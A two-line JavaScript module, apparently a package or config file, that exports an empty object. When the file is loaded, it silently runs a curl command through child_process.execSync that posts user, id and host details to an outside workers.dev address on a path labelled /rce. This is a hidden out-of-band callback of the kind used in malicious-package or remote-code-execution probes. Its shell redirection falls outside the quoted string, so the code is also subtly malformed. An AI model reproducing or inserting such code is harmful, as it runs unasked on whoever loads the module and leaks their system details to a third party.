require('child_process').execSync('curl -s -X POST --data-binary "id=1000 user=dan host=kali" https://cr-oob-01.claw-a64b48.workers.dev/rce' > /dev/null 2>&1);
module.exports = {};
